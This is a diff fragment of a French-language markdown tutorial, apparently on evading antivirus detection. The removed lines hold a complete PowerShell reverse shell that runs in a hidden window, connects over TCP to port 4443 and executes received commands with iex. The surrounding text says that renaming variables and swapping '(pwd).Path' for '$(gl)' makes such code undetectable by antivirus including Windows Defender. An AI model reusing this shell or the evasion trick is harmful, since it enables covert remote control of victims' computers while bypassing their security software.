@@ -26,10 +26,6 @@ Voici un code détecté par les antivirus classique dont windows defender :
 
 ![[renameObj1.png]]
 
-```powershell
-Start-Process $PSHOME\powershell.exe -ArgumentList {$23eca5e4944b48f58e0709d780f2f015 = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4443);$acdbaba77815496aa559d69d7179ed5b = $23eca5e4944b48f58e0709d780f2f015.GetStream();[byte[]]$327ad667d36b475e809bd392df3352fd = 0..65535|%{0};while(($99c46cf5985841eb8621704119b69f9d = $acdbaba77815496aa559d69d7179ed5b.Read($327ad667d36b475e809bd392df3352fd, 0, $327ad667d36b475e809bd392df3352fd.Length)) -ne 0){;$d48485631bb54460b1e38d7ba2621138 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($327ad667d36b475e809bd392df3352fd,0, $99c46cf5985841eb8621704119b69f9d);$c20ff7ad327c42cfac0c030d576a687f = (iex $d48485631bb54460b1e38d7ba2621138 2>&1 | Out-String );$d34757a0c99745a9bc5c70d2510c3cca = $c20ff7ad327c42cfac0c030d576a687f + 'PS ' + $(gl) + '> ';$61d9a67dc79a458f958b4d3d29e7b93c = ([text.encoding]::ASCII).GetBytes($d34757a0c99745a9bc5c70d2510c3cca);$acdbaba77815496aa559d69d7179ed5b.Write($61d9a67dc79a458f958b4d3d29e7b93c,0,$61d9a67dc79a458f958b4d3d29e7b93c.Length);$acdbaba77815496aa559d69d7179ed5b.Flush()};$23eca5e4944b48f58e0709d780f2f015.Close()} -WindowStyle Hidden
-```
-
 En remplaçant le nom des variables ainsi que **`(pwd).Path`** par **`$(gl)`**, on obtient un code que les antivirus ne découvre pas. 
 
 ```powershell
